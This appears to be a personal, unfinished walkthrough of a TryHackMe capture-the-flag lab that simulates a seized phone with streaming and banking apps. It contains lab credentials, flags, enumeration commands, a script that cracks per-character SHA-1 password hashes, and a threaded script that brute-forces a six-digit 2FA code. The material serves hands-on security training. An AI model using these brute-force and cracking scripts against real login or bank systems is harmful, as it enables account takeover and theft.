2026-01-18 19:52:00 EST -- START TIME
# BreachBlocker Unlocker
--------------------------------------

|================================================================
- Name: 
- IP Address: 10.66.131.212
- OS: 
- Notes: 

//CREDS:
	PHONE_PASSCODE = "210701"
	Hopflix:
		sbreachblocker@easterbunnies.thm | malharerocks
	Hopsec Bank:
		sbreachblocker@easterbunnies.thm | malharerocks
		(NEEDs a OTP for each login)

//Flags:
	THM{eggsposed_source_code}
	THM{fluffier_things_season_4}

|================================================================
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

// Finding the Key
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
In the Advent of Cyber Day 21 room, we are given a ZIP file and its password.

Downloading the archive and extracting it with the provided password, we find an HTA file inside.

wget -q https://assets.tryhackme.com/additional/aoc2025/SQ4/NorthPole.zip

//Password: CanYouREM3?

//Used AI to Solve:
throne123*

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


## Introduction
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
### Hopper the Detective
//When Sir BreachBlocker is captured, Hopper senses an opportunity: the last key to the stolen AoC charity funds is hidden somewhere on Sir BreachBlocker’s seized phone.

//The device looks innocent enough: a Hopflix streaming app, a banking app, messages, photos, and settings. But nothing about this op is innocent. Hopper must somehow pivot into the linked bank account, and, outsmarting the layered authentication around it, he can wrest control of the funds before King Malhare’s cronies move them for good. If he succeeds, The Best Festival Company is saved; if he fails, the story of “Colonel Panic” ends in quiet disgrace, erased like so many secrets before.

ip=10.66.131.212

//This Side Quest is unlocked by finding the Side Quest key in Advent of Cyber Day 21. Once you’ve recovered that key, visit http://$ip:21337 and enter it to unlock Hopper’s challenge. From there, your mission is simple to state and hard to execute: break into Sir BreachBlocker’s phone, bypass all authentication, and recover the final key needed to release the funds for The Best Festival Company.

Visit: firefox-esr http://$ip:21337/
Memory Key: throne123*

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


// nmap --
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

// SCAN
ports=$(nmap -Pn -p- --min-rate=1000 -T4 $ip | grep '^[0-9]' | cut -d '/' -f 1 | paste -sd ',' -)

echo $ports
//22,25,8443,21337

sudo nmap -Pn -A -p$ports $ip -oN tcp.nmap

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 39:1f:42:56:2e:b6:16:d0:a3:a3:94:18:54:4b:39:39 (ECDSA)
|_  256 b4:c9:9c:3b:78:e1:5a:d5:cc:00:86:8c:67:1e:d5:25 (ED25519)
25/tcp    open  smtp     Postfix smtpd
| smtp-commands: hostname, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ 2.0.0 Commands: AUTH BDAT DATA EHLO ETRN HELO HELP MAIL NOOP QUIT RCPT RSET STARTTLS VRFY XCLIENT XFORWARD
8443/tcp  open  ssl/http nginx 1.29.3
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.29.3
|_http-title: Mobile Portal
| tls-alpn: 
|   h2
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2025-12-11T05:00:31
|_Not valid after:  2026-12-11T05:00:31
21337/tcp open  http     Werkzeug httpd 3.0.1 (Python 3.12.3)
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
|_http-title: Unlock Hopper's Memories


# UDP scan
sudo nmap -Pn -sU --top-ports 100 $ip -oN udp.nmap

PORT   STATE         SERVICE
68/udp open|filtered dhcpc

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

//Adding host
-- Add /etc/hosts file entries --
echo -e "$ip \t breachblocker.thm" | sudo tee -a /etc/hosts
cat /etc/hosts

// 8443/tcp	ssl/http nginx 1.29.3
//https://$ip:8443/
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

//This is a phone landing page, there is a mobile portal with a few apps installed.

//Checking the HTTPS server on port 8443, we see an emulated mobile phone interface with the Hopflix and Hopsec Bank applications. However, both applications require credentials, which we do not have at this stage.


-- feroxbuster --
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

feroxbuster -k -u https://breachblocker:8443/ -w /usr/share/dirb/wordlists/big.txt --scan-limit 2 -x php,txt,html,htm,aspx,py,conf -o feroxbuster_8443.out

200  https://breachblocker.thm:8443/main.js
200  https://breachblocker.thm:8443/selfie.png
200  https://breachblocker.thm:8443/wallpaper.png
200  https://breachblocker.thm:8443/breaky.png
200  https://breachblocker.thm:8443/
200  https://breachblocker.thm:8443/index.html
200  https://breachblocker.thm:8443/hopflix-874297.db
200  https://breachblocker.thm:8443/main.py
200  https://breachblocker.thm:8443/requirements.txt

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

//Grab WebFiles
curl -k https://breachblocker.thm:8443/main.js -o main.js
curl -k https://breachblocker.thm:8443/index.html -o index.html
curl -k https://breachblocker.thm:8443/requirements.txt -o requirements.txt
curl -k https://breachblocker.thm:8443/main.py -o main.py


//I need an account number and a pin to sign into the banking app, so let’s enumerate the phone some more.

//The email field in Hopflix is prefilled which grants Sir BreachBlocker’s email. Checking the inbox discloses that the charity funds are locked.


//HOPFLIX
sbreachblocker@easterbunnies.thm


//There are some interesting text messages to say the least but the only other thing of note was an option to disable the face id on the authenticator, however that requires a 6 digit passcode.

//A bit more digging and I found a phone passcode hardcoded in main.js

const PHONE_PASSCODE = "210701"

//I turned off the authenticator face id so I don’t have issues in the future.

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


// First Flag
//What's the CODE_FLAG?
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
vim main.py

#Found a flag in the main.py

//THM{eggsposed_source_code}

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


// Second Flag
//What's the HOPFLIX_FLAG?
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
//The leaked source code also references two database files: hopflix-874297.db and hopsecbank-12312497.db. Attempting to retrieve them shows that hopsecbank-12312497.db does not exist in the web root, but hopflix-874297.db does.

curl -k https://breachblocker.thm:8443/hopflix-874297.db -o hopflix-874297.db
//Got it

curl -k https://breachblocker.thm:8443/hopsecbank-12312497.db
//Nothing

file hopflix-874297.db
hopflix-874297.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2

sqlite3 hopflix-874297.db

//List all Tables
sqlite> .tables
users

//Dumping the database reveals a suspiciously long hash for the user sbreachblocker@easterbunnies.thm.

//Dump Database
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (email text, full_name text, password_hash text);
INSERT INTO users VALUES('sbreachblocker@easterbunnies.thm','Sir BreachBlocker','03c96ceff1a9758a1ea7c3cb8d43264616949d88b5914c97bdedb1ab511a85c480d49b77c4977520ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c19b23990d991560019487301ef9926d9d99a2962b5914c97bdedb1ab511a85c480d49b77c49775207dc2d45214515ff55726de5fc73d5bd5500b3e86fa6c34156f954d4435e838f6852c6476217104207dc2d45214515ff55726de5fc73d5bd5500b3e86504fa1cfe6a6f5d5c407f673dd67d71a34cbb0772c21afa8b8f0b5e1c1a377b7168e542ea41f67a696e4c3dda73fa679990918ab333b6fab8c8e5f2296e56d15f089c659a1bbc1d2b6f70b6c80720f1a');
COMMIT;

//Make note:
echo '03c96ceff1a9758a1ea7c3cb8d43264616949d88b5914c97bdedb1ab511a85c480d49b77c4977520ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c19b23990d991560019487301ef9926d9d99a2962b5914c97bdedb1ab511a85c480d49b77c49775207dc2d45214515ff55726de5fc73d5bd5500b3e86fa6c34156f954d4435e838f6852c6476217104207dc2d45214515ff55726de5fc73d5bd5500b3e86504fa1cfe6a6f5d5c407f673dd67d71a34cbb0772c21afa8b8f0b5e1c1a377b7168e542ea41f67a696e4c3dda73fa679990918ab333b6fab8c8e5f2296e56d15f089c659a1bbc1d2b6f70b6c80720f1a' > sbreachblocker.hash

//The Hopflix authentication system implements a non-standard password hashing scheme where each password character is hashed independently using repeated SHA-1, then concatenated. This design allows the password to be recovered character-by-character offline using the database dump and application source code.

//Inspecting the login logic shows that the password hash is constructed by taking each character of the password, hashing it with SHA-1 for 5000 iterations, and then concatenating the results.

// flag2_solve.py
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
import hashlib
import string

HASH_HEX = "03c96ceff1a9758a1ea7c3cb8d43264616949d88b5914c97bdedb1ab511a85c480d49b77c4977520ebc1b24149a1fd25c37aeb2d9042d0d05492ba5c19b23990d991560019487301ef9926d9d99a2962b5914c97bdedb1ab511a85c480d49b77c49775207dc2d45214515ff55726de5fc73d5bd5500b3e86fa6c34156f954d4435e838f6852c6476217104207dc2d45214515ff55726de5fc73d5bd5500b3e86504fa1cfe6a6f5d5c407f673dd67d71a34cbb0772c21afa8b8f0b5e1c1a377b7168e542ea41f67a696e4c3dda73fa679990918ab333b6fab8c8e5f2296e56d15f089c659a1bbc1d2b6f70b6c80720f1a"

ITERATIONS = 1000  # <-- IMPORTANT: this hash file matches 1000, not 5000
CHUNK_SIZE = 40

def chain_sha1(s: str, n: int) -> str:
    res = s
    for _ in range(n):
        res = hashlib.sha1(res.encode()).hexdigest()
    return res

chunks = [HASH_HEX[i:i+CHUNK_SIZE] for i in range(0, len(HASH_HEX), CHUNK_SIZE)]

# Build rainbow table for printable ASCII
alphabet = ''.join(chr(i) for i in range(32, 127))  # space..~
lookup = {chain_sha1(ch, ITERATIONS): ch for ch in alphabet}

password = ''.join(lookup.get(c, '?') for c in chunks)
print(password)

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

python flag2_solve.py
//malharerocks


//WebSite
	https://breachblocker.thm:8443/

//Go to the Hopflix app

//Creds
	sbreachblocker@easterbunnies.thm | malharerocks


//THM{fluffier_things_season_4}

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


// Third Flag
//What's the BANK_FLAG?
#URL: https://breachblocker.thm:8443
#Account ID:	sbreachblocker@easterbunnies.thm
#Pin/Password:	malharerocks 
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

//Lets try using the same credentials we obtained for Hopflix to log in to the Hopsec Bank application.

//Log in successful; however, after authentication, the application asks us to choose an email address to which a 2FA OTP code will be sent.

# Possible RoadMap: (OTP email → 2FA → release)
- Server returns trusted_emails or trusted_domains for OTP routing
- OTP is emailed (SMTP) and then verified by /api/verify-2fa
- After 2FA verified, /api/release-funds returns {flag: BANK_FLAG}

- /api/bank-login → creates Flask session
- /api/send-2fa → generates OTP for that session
- /api/verify-2fa → checks OTP

//Looking back at the code used to generate such code shows that it is truly random.

//Once authenticated, the server generate a new session for Hopsec Bank, and returns a response indicating that 2FA is required.

// Response
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
HTTP/2 200 OK
Server: nginx/1.29.3
Date: Mon, 02 Feb 2026 04:17:21 GMT
Content-Type: application/json
Content-Length: 115
Vary: Cookie
Set-Cookie: session=.eJxtjjEOAjEMBP_i-kRBeRX_QCjyXTaKReJIjgMF4u8cIFEA9cyO9kYL6znsE4cLTJIg0py4dExvwqW0K2KIrbJop_lI4O6wZagK-s5zpdOXjM0tL3dls-YbxOF3NlHlktn-sU9yeIa6rOzPa24D9wf090PZ.aYAlUQ.EfSR0OYbRtv-U4-QouM9KdUs-zQ; HttpOnly; Path=/

{"requires_2fa":true,"success":true,"trusted_emails":["carrotbane@easterbunnies.thm","malhare@easterbunnies.thm"]}

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

//Also by clicking on 'Send OTP' button, a 6-digits OTP encrypted using AES, will be generated and stored inside the session, then sent to the user’s email address.


// main.py (Send OTP)
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
...
# Generate 2FA code
    two_fa_code = ''.join([str(random.randint(0, 9)) for _ in range(6)])
    session['bank_2fa_code'] = encrypt(two_fa_code)

    if send_otp_email(two_fa_code, otp_email) != -1:
        return jsonify({'success': True})
    else:
        return jsonify({'success': False})
...

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

//The /api/verify-2fa endpoint does not implement rate limiting, and while an invalid OTP deletes the stored code.


// main.py (/api/verify-2fa)
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
...
@app.route('/api/verify-2fa', methods=['POST'])
def verify_2fa():
    data = request.json
    code = str(data.get('code', ''))

    if not session.get('bank_authenticated', False):
        return jsonify({'error': 'Access denied.'}), 403

    if not session.get('bank_2fa_code', False):
        return jsonify({'error': 'No 2FA code generated'}), 404

    if code == decrypt(session.get('bank_2fa_code')):
        session['bank_2fa_verified'] = True
        return jsonify({'success': True})
    else:
        if 'bank_2fa_code' in session:
            del session['bank_2fa_code']
        return jsonify({'error': 'Invalid code'}), 401
...

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

//The authenticated session remains valid for each OTP request.

//Because the session remains active and OTP attempts are unrestricted, the OTP verification mechanism can be abused through repeated attempts within the same authenticated session.

//We can use this python code to brute force the OTP using our Hopsec Bank session...

// Brute_Force
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import threading

urllib3.disable_warnings()

BASE = "https://breachblocker.thm:8443"
LOGIN  = f"{BASE}/api/bank-login"
SEND   = f"{BASE}/api/send-2fa"
VERIFY = f"{BASE}/api/verify-2fa"

START = 100000
END   = 1000000
WORKERS = 20

stop_event = threading.Event()

def try_otp(i):
    if stop_event.is_set():
        return None

    otp = f"{i:06d}"

    try:
        s = requests.Session()
        s.verify = False
        s.headers.update({
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        })

        # Login
        r = s.post(LOGIN, json={
            "account_id": "sbreachblocker@easterbunnies.thm",
            "pin": "malharerocks"
        })
        if not r.json().get("requires_2fa"):
            return None

        # Generate OTP
        r = s.post(SEND, json={
            "otp_email": "carrotbane@easterbunnies.thm"
        })
        if not r.json().get("success"):
            return None

        # One-shot OTP attempt
        r = s.post(VERIFY, json={"code": otp})

        if "Invalid" not in r.text:
            stop_event.set()
            return otp, r.text

    except Exception:
        return None

    return None


total = END - START

with ThreadPoolExecutor(max_workers=WORKERS) as executor:
    futures = [executor.submit(try_otp, i) for i in range(START, END)]

    with tqdm(total=total,
              desc="Bruteforcing OTP",
              unit="otp",
              dynamic_ncols=True) as pbar:

        for future in as_completed(futures):
            pbar.update(1)

            result = future.result()
            if result:
                otp, response = result
                pbar.close()
                print(f"\n[+] OTP FOUND: {otp}")
                print("[+] Response:", response)
                executor.shutdown(wait=False, cancel_futures=True)
                break

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

---

//Looking at the code responsible for OTP generation, we see that the application generates a random code and then calls the send_otp_email function, passing both the generated code and the email address supplied by the user.


// send_otp_email 
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
...
@app.route('/api/send-2fa', methods=['POST'])
def send_2fa():
    data = request.json
    otp_email = str(data.get('otp_email', ''))
    
    if not session.get('bank_authenticated', False):
        return jsonify({'error': 'Access denied.'}), 403
    
    # Generate 2FA code
    two_fa_code = ''.join([str(random.randint(0, 9)) for _ in range(6)])
    session['bank_2fa_code'] = encrypt(two_fa_code)

    if send_otp_email(two_fa_code, otp_email) != -1:
        return jsonify({'success': True})
    else:
        return jsonify({'success': False})
...

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


//Inspecting the send_otp_email function, we see that it performs several checks to validate the supplied email address. It ensures the email format is valid, restricts certain characters, and verifies that either the full email address or the domain is allowed.



FIGURE THIS OUT....I AM Tired


>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>



>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>



